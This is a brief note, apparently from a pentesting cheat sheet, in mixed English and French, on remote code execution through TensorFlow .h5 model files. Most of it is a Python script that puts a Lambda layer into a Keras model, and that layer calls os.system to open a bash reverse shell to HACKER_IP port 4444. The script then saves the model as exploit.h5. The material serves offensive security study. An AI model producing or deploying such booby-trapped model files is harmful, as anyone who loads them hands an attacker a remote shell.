We train IA using `.h5` file 

### TensorFlow

TensorFlow permet de créer, entraîner et déployer facilement des modèles de ML qui peuvent s'exécuter dans n'importe quel environnement.

TensorFlow models can execute arbitrary code during deserialization ([reference blog](https://splint.gitbook.io/cyberblog/security-research/tensorflow-remote-code-execution-with-malicious-model)).

```python
import tensorflow as tf  
  
def exploit(x):  
	import os  
	os.system('/bin/bash - c "/bin/bash -i >& /dev/tcp/HACKER_IP/4444 0>&1"')  
	return x  
  
model = tf.keras.Sequential()  
model.add(tf.keras.layers.Input(shape=(64,)))  
model.add(tf.keras.layers.Lambda(exploit))  
model.compile()  
model.save("exploit.h5")
```

